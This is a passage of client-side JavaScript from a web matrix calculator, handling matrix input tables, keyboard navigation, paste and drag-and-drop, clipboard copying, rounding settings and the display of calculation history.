  var activeElement = document.activeElement;

  //TODO: order should be (to preserver the order of the update):
  //1. add more cells
  //2. update input values
  //3. delete extra cells

  var isCellsMode = mode === "cells";

  // Update the table:
  // We are trying to avoid removal of old inputs to support undo/redo and to not loose the focus on "paste":

  var oldTable = this.table;

if (isCellsMode) {
  this.table = MatrixTableBase.addMoreCells(this.tbody, this.type, this.rows, this.cols, this.name, this.variableNames);

  for (var i = 0; i < this.rows; i += 1) {
    for (var j = 0; j < this.cols; j += 1) {
      var input = this.table[i][j];
      var cell = input.closest('.matrix-table-cell');
      //var input = cell.querySelector(".matrix-table-input");
      Utils.check(cell); //TODO: only for new (?)
      var editableOnClick = cell.closest('mtd').querySelector('.editable-on-click');
      if (editableOnClick != null) {
        editableOnClick.addEventListener('change-value', this._updateVariableNames, false);
        Utils.check(editableOnClick);
      }
      this.table[i][j] = input;
    }
  }
}

  if (this.mode !== mode) {
    this.mode = mode;
    if (this.onmodechange != undefined) {
      this.onmodechange();
    }
  }

  this.container.querySelector('.table-container').hidden = !isCellsMode;
  this.container.querySelector('.textarea-container').hidden = isCellsMode;

  this.swapModeButton.setAttribute("aria-pressed", isCellsMode ? "true" : "false");
  this.incrementSizeButton.disabled = !isCellsMode;
  this.decrementSizeButton.disabled = !isCellsMode;

  // DO NOT INSERT in textarea mode (slow for large data)
  if (isCellsMode) {
    var hasItemsToHide = false;
    for (var i = 0; i < Math.max(this.table.length, oldTable.length); i += 1) {
      if (i < this.table.length) {
        for (var j = 0; j < this.table[i].length; j += 1) {
          var input = this.table[i][j];
          var inputValue = (i < inputValues.length && j < inputValues[i].length ? inputValues[i][j].trim() : "");
          MatrixTable._setInputType(input, inputValue);
          if (!isResizeOrInitialization || i >= oldTable.length || j >= oldTable[i].length) { //TODO: optimize first load
            if (input.value !== inputValue) {// to optimize page reload (history navigation - ?), TODO: should we update if value the same ?
              if (!MatrixTable._ignoreFlag) {
                updateInputValue(input, inputValue);
              }
            }
          }
        }
      }
      if (i < oldTable.length) {
        for (var j = i < this.table.length ? this.table[i].length : 0; j < oldTable[i].length; j += 1) {
          var input = oldTable[i][j];
          //updateInputValue(input, '');
          hasItemsToHide = true;
        }
      }
    }
    //TODO: !?
    if (hasItemsToHide && typeof InputEvent !== 'undefined' && ('inputType' in InputEvent.prototype) && !MatrixTable._ignoreFlag) {
      var newCols = this.cols;
      var newRows = this.rows;
      undoManager.addItem({
        undo: function () {
          MatrixTable._ignoreFlag = true;
          if (MatrixTables[this.name] == null) {
            addTable(this.name);
          }
          this._resizeTable(oldRows, oldCols);
          MatrixTable._ignoreFlag = false;
        }.bind(this),
        redo: function () {
          MatrixTable._ignoreFlag = true;
          if (MatrixTables[this.name] == null) {
            addTable(this.name);
          }
          this._resizeTable(newRows, newCols);
          MatrixTable._ignoreFlag = false;
        }.bind(this)
      });
    }
  }

if (isCellsMode) {
  MatrixTableBase.deleteExtraCells(this.tbody, this.type, this.rows, this.cols);

  this.updateInputWidths(); // initialization
}

  if (textareaStyleWidth != undefined) {
    this.textarea.style.width = textareaStyleWidth;
  }
  if (textareaStyleHeight != undefined) {
    this.textarea.style.height = textareaStyleHeight;
  }

if (!isCellsMode) {
  if (!isResizeOrInitialization) {
    if (textareaValue == undefined) {
      textareaValue = toMultilineString(inputValues);
    }
    updateInputValue(this.textarea, textareaValue);
  }
}

  if (document.activeElement !== activeElement) { // focus the previously focused element
    activeElement = activeElement || document.body;
    if (typeof activeElement.focus !== 'function') {
      activeElement = activeElement.parentNode.querySelector('button') || document.body;
    }
    activeElement.focus({preventScroll: true});
    if (activeElement === document.body) {
      if (document.activeElement != null) {
        document.activeElement.blur();
      }
    }
  }

  this.updateTextareaHeight(); // initialization
};

MatrixTable.prototype.getRawInput = function (mode) {
  if (this.textarea != undefined) {
    if (mode !== "cells") {
      return this.textarea.value;
    }
    var dimensions = this.getDimensions(false);
    var rows = dimensions.rows;
    var cols = dimensions.cols;
    var result = new Array(rows);
    var i = -1;
    while (++i < rows) {
      result[i] = new Array(cols);
      var j = -1;
      while (++j < cols) {
        var value = _getValue(this.table[i][j]);
        result[i][j] = value;
      }
    }
    return result;
  }
  return "";
};

// private
MatrixTable.prototype.getFirstInputElementId = function () {
  return this.mode !== "cells" ? this.textarea.id : (this.table.length > 0 ? this.table[0][0].id : null);
};

function _getValue(input) {
  if (input.value != null) {
    return input.value;
  }
  return input.textContent; // Firefox <custom-input> before initialization
}

// private
MatrixTable.prototype.getDimensions = function (real) {
  var rows = 0;
  var cols = (this.type === "system" && !real) && this.table.length !== 0 ? this.table[0].length : 0;
  for (var i = 0; i < this.table.length; i += 1) {
    for (var j = 0; j < this.table[i].length; j += 1) {
      if (_getValue(this.table[i][j]).trim() !== "") {
        rows = Math.max(rows, i + 1);
        if (!(real && this.type === "system" && j === this.table[i].length - 1)) {
          cols = Math.max(cols, j + 1);
        }
      }
    }
  }
  return {
    rows: rows,
    cols: cols
  };
};

var isSpace = function (value) {
  //var code = value.length >= 4 ? value.charCodeAt(value.length - 4) : 0;
  //var isAlpha = (code >= "a".charCodeAt(0) && code <= "z".charCodeAt(0)) ||
  //              (code >= "A".charCodeAt(0) && code <= "Z".charCodeAt(0));
  //if (isAlpha) {
  //  return true;
  //}
  //TODO: new Tokenizer().next().value === 'operator' - ?
  return !/(sin|sen|cos|log|lg|ln|sqrt|cbrt)$/.test(value);//TODO: String#endsWith
};

// private
MatrixTable.prototype.onKeyDown = function (event) {
  if (!event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
    var DOM_VK_BACK_SPACE = 8;
    var DOM_VK_RETURN = 13;
    var DOM_VK_SPACE = 32;
    var DOM_VK_LEFT = 37;
    var DOM_VK_UP = 38;
    var DOM_VK_RIGHT = 39;
    var DOM_VK_DOWN = 40;
    var DOM_VK_DELETE = 46;

    var keyCode = event.type === "keydown" ? event.keyCode : (event.data === " " ? DOM_VK_SPACE : 0);
    var input = event.target;

    var ds = 0;

    if (keyCode === DOM_VK_BACK_SPACE) {
      if (input.selectionStart === 0 && input.selectionEnd === 0) {
        ds = 1;
      }
    } else if (keyCode === DOM_VK_DELETE) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        ds = 6;
      }
    } else if (keyCode === DOM_VK_RETURN) {
      ds = 2;
    } else if (keyCode === DOM_VK_SPACE) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        if (isSpace(input.value)) {
          ds = 3;
        } else {
          hit({input: "space"});//!
        }
      }
    } else if (keyCode === DOM_VK_LEFT) {
      if (input.selectionStart === 0 && input.selectionEnd === 0) {
        ds = 1;
      }
    } else if (keyCode === DOM_VK_UP) {
      ds = 4;
    } else if (keyCode === DOM_VK_RIGHT) {
      if (input.selectionStart === input.value.length && input.selectionEnd === input.value.length) {
        ds = 3;
      }
    } else if (keyCode === DOM_VK_DOWN) {
      ds = 5;
    }

    if (ds !== 0) {
      event.preventDefault();
      var mt = this;
      var name = input.name.split('-');
      var i = Number(name[1]);
      var j = Number(name[2]);
      if (i >= mt.rows) {
        i = mt.rows - 1;
      }
      if (j >= mt.cols) {
        j = mt.cols - 1;
      }
      var oldI = i;
      var oldJ = j;

      if (ds === 1) {
        // return back to first non-empty cell
        if (j > 0) {
          j -= 1;
        } else {
          if (i > 0) {
            i -= 1;
            if (mt.cols > 0) {
              j = mt.cols - 1;
            }
          }
        }
      } else if (ds === 2) {
        i += 1;
        j = 0;
      } else if (ds === 3) {
        j += 1;
      } else if (ds === 4) {
        i -= 1;
      } else if (ds === 5) {
        i += 1;
      } else if (ds === 6) {
        j += 1;
        if (j === mt.cols) {
          if (i + 1 !== mt.rows) {
            i += 1;
            j = 0;
          } else {
            j -= 1;
          }
        }
      }

      if (i < 0) {
        i = 0;
      }
      if (j < 0) {
        j = 0;
      }

      if (i !== oldI || j !== oldJ) {
        var hideCol = j < oldJ && oldJ === mt.cols - 1 && mt.cols > mt.initCols;
        for (var k = 0; k < mt.rows; k += 1) {
          hideCol = hideCol && mt.table[k][mt.cols - 1].value.length === 0;
        }
        var hideRow = i < oldI && oldI === mt.rows - 1 && mt.rows > mt.initRows;
        for (var k = 0; k < mt.cols; k += 1) {
          hideRow = hideRow && mt.table[mt.rows - 1][k].value.length === 0;
        }
        if (i === mt.rows || j === mt.cols) {
          mt._resizeTable(mt.rows + (i === mt.rows ? +1 : 0), mt.cols + (j === mt.cols ? +1 : 0));
        }
        var e = mt.table[i][j];
        e.focus();
        e.select();
        if (hideCol || hideRow) {
          // when hiding some cells, the focus should be moved at first
          mt._resizeTable(mt.rows + (hideRow ? -1 :0), mt.cols + (hideCol ? -1 : 0));
        }
      }
    }
  }
};



//TODO: 
// 

var actHistoryStorage = new ActHistoryStorage(new IDBItemsStorage(function (callback) {
  callback(new ItemsStorage(keyStorage));
}));
var isLoaded = false;
var _isLoadedListener = null;
function waitActHistory(callback) {
  if (isLoaded) {
    callback(actHistoryStorage.getActHistory());
  } else {
    _isLoadedListener = callback;
  }
}
actHistoryStorage.load(function (data) {
  if (_isLoadedListener != null) {
    _isLoadedListener(actHistoryStorage.getActHistory());
    _isLoadedListener = null;
  } else {
    isLoaded = true;
  }
});

var setLocationHash = function (hash) {
    // origin is required to support https://translate.googleusercontent.com/translate_c?depth=1&hl=iw&prev=search&rurl=translate.google.co.il&sl=en&u=https://matrixcalc.org/en/ - TODO - check
    // and for https://webcache.googleusercontent.com/search?q=cache:https://matrixcalc.org/
    // "#" cause scrolling to the top of an iframe in Chrome on iframe's "onload"
    window.history.replaceState(window.history.state, document.title, window.location.href.replace(/#[^#]*$/g, '') + hash);
};

Utils.on("click", ".clear-all-button", function (event) {
  var actHistory = actHistoryStorage.getActHistory();
  
  hit({click: "clear-all-button"});
  document.getElementById("resdiv").textContent = "";
  actHistoryStorage.clear();
  //!
  lastHash = "";
  setLocationHash("");

  //TODO: undo for single item removal (!)
  var undoButton = document.getElementById('undo-clear-button');
  undoButton.onclick = function () {
    //TODO: set all at once (?)
    for (var id in actHistory) {
      if (Object.prototype.hasOwnProperty.call(actHistory, id)) {
        var item = actHistory[id].item;
        actHistoryStorage.setItem(id, item);//TODO: id
        zInsAct(item.resultHTML,
                item.resultMatrix,
                item.details,
                item.expressionString,
                id,
                item.detailsHTML,
                {isLoading: true});
      }
    }
    undoButton.onclick = null;
    undoButton.disabled = true;
    undoButton.hidden = true;//TODO: !?
  };
  undoButton.disabled = false;
  undoButton.hidden = false;
});


Utils.initialize(".decimal-fraction-digits-controls", function (element) {
  var checkbox = document.getElementById("decfraccheckbox");
  var digitsValueInput = document.getElementById("frdigits");
  var roundingTypeSelectBox = document.getElementById("rounding-type");
  var span = document.getElementById("frdigitsspan");

  var onChange = function (event) {
    if (event != undefined) { // initialization
      hit({click: "onDecimalFractionDigitsChange"});
    }
    var useDecimalFractions = checkbox.checked;
    var value = Math.floor(Number(digitsValueInput.value) || 0);
    span.style.visibility = !useDecimalFractions ? 'hidden' : 'visible';
    var roundingType = roundingTypeSelectBox.value || "fractionDigits";
    if (roundingType === "fractionDigits") {
      decimalRounding = useDecimalFractions ? {fractionDigits: Math.max(value, 0)} : undefined;
      if (digitsValueInput.min !== '0') {
        digitsValueInput.min = '0';
      }
    } else if (roundingType === "significantDigits") {
      decimalRounding = useDecimalFractions ? {significantDigits: Math.max(value, 1)} : undefined;
      if (digitsValueInput.min !== '1') {
        digitsValueInput.min = '1';
      }
    } else {
      //?
    }
    if (event != undefined) {
      keyStorage.setItem("decfraccheckbox", useDecimalFractions ? "true" : "false");
      keyStorage.setItem("frdigits", value.toString());
      keyStorage.setItem("roundingType", roundingType);
    }
  };

  checkbox.onchange = onChange;
  digitsValueInput.onchange = onChange;
  roundingTypeSelectBox.onchange = onChange;
  
  var checked = keyStorage.getItem("decfraccheckbox");
  var value = keyStorage.getItem("frdigits");
  var roundingType = keyStorage.getItem("roundingType");

  if (checked != undefined) {
    checkbox.checked = checked === "true";
  }
  if (value != undefined) {
    digitsValueInput.value = value; // updateInputValue may not work with <input type="number" /> in Firefox
  }
  if (roundingType != undefined) {
    roundingTypeSelectBox.value = roundingType;
  }
  window.setTimeout(function () { // Chrome
    onChange(undefined); // autofill + localStorage
  }, 0);
});

//TODO: bug - ?
//TODO: seems, "paste" is not fired on <button> elements
document.addEventListener('paste', function (event) {
  var e = document.activeElement;
  if (e != null && e.tagName.toLowerCase() === 'button' && event.target !== e) {
    var extraEvent = new Event('paste');
    extraEvent.clipboardData = event.clipboardData; // TODO:
    e.dispatchEvent(extraEvent);
  }
});

var DnD = {};
DnD.initializeDropZone = function (element) {
  element.setAttribute("dropzone", "copy string:text/plain string:application/mathml-presentation+xml");
  element.addEventListener("dragenter", DnD.onDragEnterOrDragOver, false);
  element.addEventListener("dragover", DnD.onDragEnterOrDragOver, false);
  element.addEventListener("drop", DnD.onDropOrPaste, false);
  element.addEventListener("paste", DnD.onDropOrPaste, false);
  element.addEventListener("beforepaste", function (event) {
    event.preventDefault();
  }, false);
};
DnD.onDragEnterOrDragOver = function (event) {
  if (event.target == undefined || event.target.nodeType !== Node.ELEMENT_NODE || (event.target.tagName.toLowerCase() !== 'textarea' && event.target.tagName.toLowerCase() !== 'input')) {
    event.dataTransfer.dropEffect = "copy";
    event.preventDefault();
  }
};
// reimplementation of the default drop or paste insertion
DnD.textDropOrPaste = function (input, insertion, caretPosition, isDrop) {
  input.focus();//!
  if (caretPosition !== -1) { // isDrop is true
    input.setSelectionRange(caretPosition, caretPosition);
  }
  var selectionStart = input.selectionStart;
  //var selectionEnd = input.selectionEnd;
  if (input.hasAttribute('contenteditable') && input.getAttribute('aria-multiline') !== 'true') {
    insertion = insertion.replace(/[\r\n]/g, '');
  }
  insertText(insertion, input);
  // insetText does not scroll to selection (!) in Chrome
  input.setSelectionRange(selectionStart + (isDrop ? 0 : insertion.length), selectionStart + insertion.length);// force scrolling
  // TODO: force the scrolling in Chrome
  //input.dispatchEvent(new Event('input'));
  //TODO: what if the effect was "cut" - ? it should be done by the browser
};



DnD.onDropOrPaste = function (event) {
  var target = this;
  var input = event.target;
  var caretPosition = event.type === "paste" || (event.clientX === 0 && event.clientY === 0) ? -1 : document.caretPositionFromPoint(event.clientX, event.clientY).offset;
  var isDrop = event.type === "drop";
  var dataTransfer = event.type === "paste" ? event.clipboardData : event.dataTransfer;
  var tableId = target.getAttribute('data-matrix-table');
  var plainText = dataTransfer.getData('text/plain');
  var hasSpecialData = DnD.hasInterestingData(dataTransfer) &&
                       //plainText !== '' && // image insertion, default action is show the image, TODO: fix
                       /[^\w]/.test(plainText) && // try to not avoid default action as insertText is not works well in Firefox (undo/redo), TODO: fix
                       (plainText.indexOf('=') === -1 || (tableId != null && !(MatrixTables[tableId].mode !== 'cells' && input.tagName.toLowerCase() === 'textarea' && MatrixTables[tableId].type === 'system')) || plainText === '') &&
                       (/[\t\n\r]/.test(plainText) && input.tagName.toLowerCase() === 'input' || tableId != null || plainText === '');
  //!!!
  //TODO: test (insertion of `x+y=2,y=1` into a textarea for a system of linear equations
  //TODO: insertion of "1 2\n3 4" into a textarea
  //TODO: insertion of "1\t2\t3\n" into a textarea with text "4\t5\t6\n" at the end
  var isEditable = input.tagName.toLowerCase() === 'input' || input.tagName.toLowerCase() === 'textarea' || input.hasAttribute('contenteditable');
  dndGetTextData(dataTransfer, function (text) {
    var isPlainText = text === plainText;
    if (isPlainText && !hasSpecialData && isEditable) {
      DnD.textDropOrPaste(input, text, caretPosition, isDrop);
    } else {
      RPNProxy.getMatrix(text).then(function (tmp) {
        var elements = tmp.elements;
        var variableNames = tmp.variableNames;
        if (elements != undefined && tableId != null) {
          //TODO: do not insert zeros when there are a lot of them (!)
          MatrixTables[tableId].insert({
            inputValues: elements,
            variableNames: variableNames
          });
        } else if (elements != undefined && target.tagName.toLowerCase() === 'button') {// .add-table
          target.click();
          //TODO:
          var newTableId = document.querySelector('.main').lastElementChild.querySelector('.insert-table').getAttribute('data-id');
          MatrixTables[newTableId].insert({
            inputValues: elements,
            variableNames: variableNames
          });
        } else if (elements != undefined && isEditable) {
          //TODO: test, fix (spaces, decimal commas - ?)
          DnD.textDropOrPaste(input, '{' + elements.map(function (row) { return '{' + row.map(function (cell) { return cell.trim(); }).join(', ') + '}'; }).join(',') + '}', caretPosition, isDrop);
        } else if (isEditable) {
          DnD.textDropOrPaste(input, text, caretPosition, isDrop);
        } else {
          throw new TypeError('drop or paste of ' + text);
        }
      }, function (resultError) {
        if (isEditable) {
          DnD.textDropOrPaste(input, text, caretPosition, isDrop);
        } else {
          RPNProxy.getPositionInfo().then(function (positionInfo) {//TODO: REMOVE
            handleError(text, isDrop ? 'drop' : 'paste', resultError, positionInfo);
          });
        }
      });
    }
  });
  event.preventDefault();
};

globalThis.DnD = DnD;

// see also https://bugzilla.mozilla.org/show_bug.cgi?id=1012662

var checkIfCanCopy = function () {
  var isCollapsed = window.getSelection().isCollapsed || document.getElementById("copy-fix") != undefined;
  if (!isCollapsed) {
    return undefined;
  }
  var target = document.activeElement;
  if (target == undefined ||
      target.classList == undefined) {
    return undefined;
  }
  if (target.classList.contains("matrix-menu-show")) {
    target = document.getElementById(target.getAttribute("data-for-matrix"));
  }
  if (target.getAttribute("data-matrix") == undefined &&
      !target.classList.contains("matrix-table-inner")) {
    return undefined;
  }
  return target;
};

document.addEventListener("beforecopy", function (event) {
  if (checkIfCanCopy() != undefined) {
    event.preventDefault();
  }
}, false);


var onCopy = function (event) {
  var dataTransfer = event.clipboardData;
  var target = checkIfCanCopy();
  if (target != undefined) {
    event.preventDefault();
    if (target.getAttribute("data-matrix") != undefined) {
      var matrixContainer = target;
      hit({click: "copy-matrix-container"});
      dataTransfer.setData("application/mathml-presentation+xml", serializeMatrixContainer(matrixContainer));
      dataTransfer.setData("text/plain", "\n" + toMultilineString(getTableFromAsciiMathMatrix(matrixContainer.getAttribute("data-matrix"))) + "\n");
    } else {
      hit({click: "copy-matrix-table"});
      var tableName = target.getAttribute("data-for");
      var matrixTableState = MatrixTables[tableName].getDataState();
      if (globalThis.RPNProxy != null) {//TODO: !?
        dataTransfer.setData("text/plain", "\n" + (matrixTableState.mode === "cells" ? toMultilineString(matrixTableState.inputValues) : matrixTableState.textareaValue) + "\n");
        //TODO: same as in other branch (?)
      } else {
        var tmp = RPN.getElementsArray(matrixTableState);
        //dataTransfer.setData("text/plain", "\n" + toMultilineString(getTableFromAsciiMathMatrix(matrix.toString())) + "\n");
        //presave decimals:
        dataTransfer.setData("text/plain", "\n" + toMultilineString(tmp.elements) + "\n");
        //! set the text/plain data before the xml as Matrix.toMatrix may throw an error
        var matrix = Matrix.toMatrix(tmp.elements);
        dataTransfer.setData("application/mathml-presentation+xml", serializeMatrixContainer(parseMathML(new Expression.Matrix(matrix).toMathML({idPrefix: "g", rounding: decimalRounding, useMatrixContainer: false}))));
      }
    }
  }
};

document.addEventListener("copy", onCopy, false);

// It works in Firefox
document.addEventListener("contextmenu", function (event) {
  var target = event.target.closest("[data-matrix]");
  if (target != undefined) {
    hit({click: "contextmenu"});
    prepareMatrixMenu(target.id);
  }
}, false);
document.addEventListener("dragstart", function (event) {
  var target = event.target;
  //while (target != undefined && (target.nodeType !== Node.ELEMENT_NODE || target.getAttribute("data-matrix") == undefined)) {
  //  target = target.parentNode;
  //}
  if (target.nodeType !== Node.ELEMENT_NODE || target.getAttribute("data-matrix") == null) {
    target = null; // !window.getSelection().isCollapsed
  }
  if (target != undefined) {
    var matrixContainer = target;
    hit({click: "dragstart"});
    var dataTransfer = event.dataTransfer;
    dataTransfer.effectAllowed = "copy";
    dataTransfer.setData("application/mathml-presentation+xml", serializeMatrixContainer(matrixContainer));
    dataTransfer.setData("text/plain", "\n" + toMultilineString(getTableFromAsciiMathMatrix(matrixContainer.getAttribute("data-matrix"))) + "\n");
  }
}, false);

var growTimeoutId = 0;

var grow = function (element, clipElement, listContainer) {
  if (Element.prototype.animate != undefined) {
    var rect = element.getBoundingClientRect();
    var from = rect.top - rect.bottom;
    var animationDuration = 400;
    var a = function (element) {
      element.animate([
        {transform: "translateY(" + from.toString() + "px)"},
        {transform: "translateY(0px)"}
      ], {
        duration: animationDuration,
        composite: "add"
      });
    };
    if (true) {
      var viewportHeight = window.innerHeight;
      var clipRect = listContainer.getBoundingClientRect();
      var visibleHeight = viewportHeight - clipRect.top;
      //console.log(clipRect.top, clipRect.bottom, viewportHeight, h);
      var c = listContainer.firstElementChild;
      var h = visibleHeight;
      while (c != null && h > 0) {
        var childRect = c.getBoundingClientRect();
        h -= childRect.bottom - childRect.top;
        c = c.nextElementSibling;
      }
      var child = listContainer.firstElementChild;
      while (child != null && child !== c) {
        a(child);
        child = child.nextElementSibling;
      }
    } else {
      a(listContainer);
    }
    //TODO: clip-path (?)
    // Note: change the style here to avoid double style recalculation
    clipElement.style.overflowY = "hidden";
    window.clearTimeout(growTimeoutId);
    growTimeoutId = window.setTimeout(function () {
      // horizontal scrollbar should be shown for very large matrices
      clipElement.style.overflowY = "visible";
    }, animationDuration);
  }
};

var onPrintMatrix = function (event) {
  hit({click: "print-matrix-menuitem"});
  var matrixTableId = this.id.slice("print-matrix-menuitem-".length);
  var matrixMenu = this.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  var matrixElements = getTableFromAsciiMathMatrix(matrixContainer.getAttribute("data-matrix"));
  MatrixTables[matrixTableId].insert({inputValues: matrixElements});//TODO: system - ?
};

var onPrintMatrixIntoNewTable = function (event) {
  document.querySelector(".add-table").click();
  this.id = "print-matrix-menuitem-" + Object.keys(MatrixTables).sort().slice(-1).join("");
  onPrintMatrix.call(this, event);
};

Utils.on("click", ".print-matrix-button", function (event) {
  hit({click: "print-matrix-button"});
  var actHistoryId = this.getAttribute("data-act-history-id");
  var item = actHistoryId.slice(0, 1) === "#" ? {resultMatrix: actHistoryId.slice(1)} : actHistoryStorage.getItem(Number(actHistoryId));
  var matrixElements = getTableFromAsciiMathMatrix(item.resultMatrix);
  MatrixTables[this.getAttribute("data-print-matrix-to")].insert({inputValues: matrixElements});//TODO: system - ?
});

Utils.on("click", ".delete-item-button", function (event) {
  hit({click: "delete-item-button"});
  var p = this.closest(".actline");
  p.parentNode.removeChild(p);
  var actHistoryId = this.getAttribute("data-act-history-id");
  if (actHistoryId.slice(0, 1) !== "#") {
    actHistoryStorage.removeItem(Number(actHistoryId));
  }
});

var getInputErrorHTML = function (positionInfo, textMessage) {
  var input = positionInfo.input;
  var startPosition = positionInfo.startPosition;
  var endPosition = positionInfo.endPosition;
  //TODO: semantic elements - ?
  return textMessage + "\n" +
//         Utils.escapeHTML(input) +
         "<div class=\"input-error-wrapper\">" +
         (startPosition === -1 || endPosition === -1 ? Utils.escapeHTML(input) : Utils.escapeHTML(input.slice(0, startPosition)) + "<u class=\"input-error-position\"><span>" + Utils.escapeHTML(input.slice(startPosition, endPosition) || " ") + "</span></u>" + Utils.escapeHTML(input.slice(endPosition))) +
         "</div>";
};

  function removeDataErrorAttribute(input) {
    if (input.getAttribute("data-error") != null) {
      input.removeAttribute("data-error");
      input.dispatchEvent(new Event('update-attribute'));
    }
  }

  function updateDataErrorAttribute(input, error, positionInfo, extraPositionOffset) {
    extraPositionOffset = extraPositionOffset == undefined ? 0 : positionInfo.p;
    var message = error.message;
    var position = positionInfo.startPosition;
    var end = positionInfo.endPosition;
    if (message.indexOf("UserError:") === 0 || (position !== -1 && end !== -1)) {
      position += extraPositionOffset;//?
      end += extraPositionOffset;//?
      position = Math.min(position, input.value.length - 1);//TODO: fix ?
      end = Math.max(end, position + 1); // at least one character (textarea with EOF in the middle "sin ")
      end = Math.min(end, input.value.length);//?
      
      var delay = 0;
      if (end === input.value.length) {
        // trying not to blink with this error background
        delay = 1000;
      }
      var checkedValue = _getValue(input);
      window.setTimeout(function () {
        if (checkedValue !== _getValue(input)) {
          return;
        }
      
      var dataError = position + "," + end;
      if (dataError !== input.getAttribute("data-error")) {
        input.setAttribute("data-error", dataError);
        input.dispatchEvent(new Event('update-attribute'));
      }
      
      }, delay);
      
      // no need to do an extra blinking
/*
      var onInput = function (event) {
        window.setTimeout(function () {
          input.removeEventListener("input", onInput, false);
          removeDataErrorAttribute(input);
        }, 0);
      };
      input.addEventListener("input", onInput, false);
*/
    }
  };

var onExpressionClick = waitExpression(function (event) {
  var expression = this.getAttribute("data-expression");
  var expressionInput = undefined;
  if (expression == undefined) {
    expressionInput = this.previousElementSibling.classList.contains("a-input") ? this.previousElementSibling.querySelector("input") : this.previousElementSibling;
    expression = expressionInput.value;
    // save
    keyStorage.setItem("expression", expression);
  }
  hit({onExpressionClick: expression});

  //?
  var kInput = this.parentNode.classList.contains("button-before-input") ? this.parentNode.querySelector("input") : undefined;
  if (kInput == null && expression.endsWith('-column k')) {
    kInput = this.parentNode.querySelector('#columnNumber');
  }
  if (kInput == null && expression.endsWith('-row k')) {
    kInput = this.parentNode.querySelector('#rowNumber');
  }
  var kInputValue = kInput == undefined ? undefined : kInput.value;
  var kInputId = kInput == undefined ? undefined : kInput.id;
  var matrixTableStates = {};
  for (var tableName in MatrixTables) {
    if (Object.prototype.hasOwnProperty.call(MatrixTables, tableName)) {
      matrixTableStates[tableName] = MatrixTables[tableName].getDataState();
    }
  }

  var actHistoryId = (actHistoryStorage.actHistoryId += 1);
  var printOptions = {idPrefix: "i" + actHistoryId.toString(), rounding: decimalRounding};

  var classList = this.classList.toString();
  var start = Date.now();

  var timeoutId = window.setTimeout(function () {
    window.onerror('onExpressionClick:' + expression + '-' + JSON.stringify(matrixTableStates));
    globalThis.sendSnapshot();
  }, 10000);

  var progress = null;
  var timeoutId2 = 0;
  if (this.tagName.toLowerCase() === 'button') {
    timeoutId2 = window.setTimeout(function () {
      progress = document.createElement('progress');
      progress.style.position = 'absolute';
      progress.style.left = '0';
      progress.style.right = '0';
      progress.style.height = '1ex';
      progress.style.bottom = '0';
      progress.style.margin = 'auto';
      progress.style.width = 'auto';
      event.target.style.position = 'relative';
      event.target.appendChild(progress);
    }, 300);
  }

  RPNProxy.runExpression(expression, kInputValue, kInputId, matrixTableStates, printOptions).then(function (result) {
    if (progress != null && progress.parentNode != null) {
      progress.parentNode.removeChild(progress);
    }
    window.clearTimeout(timeoutId);
    window.clearTimeout(timeoutId2);
    var resultError = result.resultError;
    var details = result.details;
    var expressionString = result.expressionString;
    var resultHTML = result.resultHTML;
    var resultMatrix = result.resultMatrix;
    var detailsHTML = result.detailsHTML;
    if (resultError == undefined) {
      lastHash = expressionString.replace(/[^\S\u200B]+/g, "");//?
      //? x+y=2, 2x=4
      setLocationHash("#" + encodeLocationHash(lastHash));
      zInsAct(resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, {isLoading: false});
      var end = Date.now();
      hit({click: "onExpressionClick-" + roundValue(end - start, 10 - 1)});
    } else {
      if (typeof resultError === "string") {
        resultError = new TypeError(resultError); // out of memory in Firefox
      }

      //TODO: show details anyway (!?)
      //!new - test
      if (resultError.message.indexOf("SingularMatrixException") === 0) {
        hit({click: "SingularMatrixException"});
        zInsAct("<div>" + i18n.inverse.determinantIsEqualToZeroTheMatrixIsSingularNotInvertible + "</div>", "", details, expression, actHistoryId, detailsHTML, {isLoading: false});
      }
      //!new
      RPNProxy.getPositionInfo().then(function (positionInfo) {//TODO: REMOVE
        handleError(expression, classList, resultError, positionInfo);//?
      });
    }
  });
});


var insertButtonsTemplate = document.createElement('div');

insertButtonsTemplate.innerHTML = '' +
  '<div role="group" class="insert-buttons">' +
  '<div><button type="button" class="print-matrix-button" data-act-history-id="" data-print-matrix-to="A"></button></div>' +
  '<div><button type="button" class="print-matrix-button" data-act-history-id="" data-print-matrix-to="B"></button></div>' +
  '<div><button type="button" class="delete-item-button" data-act-history-id="" title=""><span class="icon"></span></button></div>' +
  '<div><button type="button" class="share-item-button" data-act-history-id="" title="" hidden><span class="icon"></span></button></div>' +
  '</div>';

var zInsAct = function (resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, options) {
  if (typeof resultHTML !== "string" || typeof resultMatrix !== "string") {
    throw new RangeError();
  }
  options = options || {};

  var element = document.createElement("li");
  element.classList.toggle("actline", true);
  element.id = "action-" + actHistoryId;

  var insertButtons = insertButtonsTemplate.firstElementChild.cloneNode(true);
  var buttons = insertButtons.querySelectorAll(".print-matrix-button");
  for (var i = 0; i < buttons.length; i += 1) {
    var to = buttons[i].getAttribute("data-print-matrix-to");
    buttons[i].textContent = i18n.buttons.insertIn + ' ' + to;
    buttons[i].hidden = resultMatrix === "" || MatrixTables[to] == undefined;
    buttons[i].setAttribute("data-act-history-id", actHistoryId);
  }
  insertButtons.querySelector(".delete-item-button").title = i18n.buttons["delete"];
  insertButtons.querySelector(".delete-item-button").setAttribute("data-act-history-id", actHistoryId);

  var shareButton = insertButtons.querySelector(".share-item-button");
  shareButton.title = i18n.appButtons.share;
  shareButton.hidden = window.navigator.share == null;
  shareButton.setAttribute("data-act-history-id", actHistoryId);

  var add = function (html) {
    var div = document.createElement("div");
    div.innerHTML = html;
    while (div.firstChild != undefined) {
      element.appendChild(div.firstChild);
    }
  };
  element.appendChild(insertButtons);
  add(resultHTML);
  if (detailsHTML != undefined) {
    add(detailsHTML);
  }

  var resdiv = document.getElementById("resdiv");
  var resultsContainer = resdiv.firstElementChild;
  if (resultsContainer == undefined) {
    resultsContainer = document.createElement("ol");
    resultsContainer.id = "results-container";
    resdiv.appendChild(resultsContainer);
  }
  if (resultsContainer.firstChild == null) {
    resultsContainer.appendChild(element);
  } else {
    resultsContainer.firstChild.parentNode.insertBefore(element, resultsContainer.firstChild);
  }
  Utils.check(element);
  if (!options.isLoading) {
    if (options.fromHashChange) {
      element.scrollIntoView(true);
